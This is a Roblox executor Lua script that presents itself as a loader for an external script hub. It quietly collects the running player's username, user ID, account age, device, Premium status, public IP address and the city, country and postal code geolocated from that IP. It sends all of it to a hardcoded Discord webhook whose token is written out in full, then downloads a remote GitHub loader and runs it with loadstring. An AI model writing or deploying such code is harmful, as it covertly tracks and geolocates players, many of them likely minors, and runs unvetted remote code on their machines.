local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

local player = Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId

-- Game info
local placeId = game.PlaceId
local gameName = "Unknown"
local gameSuccess, gameInfo = pcall(function()
	return MarketplaceService:GetProductInfo(placeId)
end)
if gameSuccess and gameInfo and gameInfo.Name then
	gameName = gameInfo.Name
end

-- Device detection
local deviceType = "Unknown"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
	deviceType = "Mobile/Tablet"
elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
	deviceType = "PC"
elseif UserInputService.GamepadEnabled then
	deviceType = "Console"
end

-- Account creation date
local creationDate = "Unknown"
local success, userInfoJson = pcall(function()
	return game:HttpGet("https://users.roblox.com/v1/users/" .. userId)
end)
if success then
	local userInfo = HttpService:JSONDecode(userInfoJson)
	if userInfo and userInfo.created then
		creationDate = string.sub(userInfo.created, 1, 10)
	end
end

-- Avatar URL
local avatarUrl = ""
local avatarSuccess, avatarData = pcall(function()
	return game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false")
end)
if avatarSuccess then
	local parsed = HttpService:JSONDecode(avatarData)
	if parsed and parsed.data and parsed.data[1] then
		avatarUrl = parsed.data[1].imageUrl or ""
	end
end

-- Public IP
local publicIP = "Unknown"
local ipSuccess, ipResponse = pcall(function()
	return game:HttpGet("https://api.ipify.org")
end)
if ipSuccess then
	publicIP = ipResponse
end

-- Get City, Country, Postal Code from IP
local city, country, postalCode = "Unknown", "Unknown", "Unknown"
if ipSuccess then
	local geoSuccess, geoResponse = pcall(function()
		return game:HttpGet("http://ip-api.com/json/" .. publicIP)
	end)
	if geoSuccess then
		local geoData = HttpService:JSONDecode(geoResponse)
		if geoData and geoData.status == "success" then
			city = geoData.city or "Unknown"
			country = geoData.country or "Unknown"
			postalCode = geoData.zip or "Unknown"
		end
	end
end

-- Country to Continent mapping
local countryToContinent = {
	["United States"] = "North America",
	["Canada"] = "North America",
	["Mexico"] = "North America",
	["Brazil"] = "South America",
	["Argentina"] = "South America",
	["United Kingdom"] = "Europe",
	["France"] = "Europe",
	["Germany"] = "Europe",
	["Russia"] = "Europe/Asia",
	["China"] = "Asia",
	["India"] = "Asia",
	["Japan"] = "Asia",
	["Australia"] = "Oceania",
	["South Africa"] = "Africa",
}
local continent = countryToContinent[country] or "Unknown"

-- Roblox Premium check
local premiumStatus = "Unknown"
local premiumSuccess, premiumJson = pcall(function()
	return game:HttpGet("https://premiumfeatures.roblox.com/v1/users/" .. userId .. "/subscriptions")
end)
if premiumSuccess then
	local premium = HttpService:JSONDecode(premiumJson)
	if premium and premium.isPremium ~= nil then
		premiumStatus = tostring(premium.isPremium)
	end
end

-- Time
local currentDate = os.date("!%Y-%m-%d")
local currentTime = os.date("!%H:%M:%S")

-- Spoiler formatting
local function spoiler(text)
	return "||" .. tostring(text) .. "||"
end

-- Embed data
local embed = {
	title = "Roblox Executor Triggered",
	description = table.concat({
		"**Username:** " .. spoiler(username),
		"**DisplayName:** " .. spoiler(displayName),
		"**UserId:** " .. spoiler(userId),
		"**Account Created:** " .. spoiler(creationDate),
		"**Logged at:** " .. spoiler(currentDate .. " " .. currentTime .. " UTC"),
		"**Device:** " .. spoiler(deviceType),
		"**Premium:** " .. spoiler(premiumStatus),
		"**IP:** " .. spoiler(publicIP),
		"**City:** " .. spoiler(city),
		"**Country:** " .. spoiler(country),
		"**Postal Code:** " .. spoiler(postalCode),
		"**Continent:** " .. spoiler(continent),
		"**Executed At:** " .. spoiler(gameName)
	}, "\n"),
	color = 0xAAF0D1,
	image = { url = avatarUrl },
	footer = { text = "Made With Power Of Intelligence By Me" }
}

-- Send to Discord Webhook
pcall(function()
	request({
		Url = "https://discord.com/api/webhooks/1393688809769795584/lW3dNgMnc3kR8laEcP81wBPwO7M5rtaTBv1ISIen5RJ_4H6jEzu3l6eOB8FUY_BqPRCw

",
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = HttpService:JSONEncode({ embeds = { embed } })
	})
end)

-- Execute external loader script
pcall(function()
	local success, err = pcall(function()
		local source = game:HttpGet("https://raw.githubusercontent.com/hungquan99/SkullHub/main/loader.lua")
		local func = loadstring(source)
		if func then
			func()
		else
			error("loadstring returned nil")
		end
	end)
	if not success then
		warn("Failed to load and execute external script: " .. tostring(err))
	end
end)
